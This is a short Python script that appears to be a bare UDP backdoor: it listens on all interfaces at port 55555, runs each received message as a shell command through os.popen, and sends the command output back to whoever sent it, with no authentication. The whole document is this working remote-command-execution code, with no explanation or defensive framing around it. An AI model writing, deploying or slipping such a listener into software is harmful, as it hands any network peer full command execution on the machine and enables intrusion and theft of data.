import socket, os

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

s.bind(("0.0.0.0", 55555))
print("[@]")
while True:
    addr = s.recvfrom(4096)
    mess = addr[0]
    cl = addr [1]
    cm_resp = os.popen(mess.decode()).read()
    response = cm_resp.encode()
    s.sendto(response, cl)
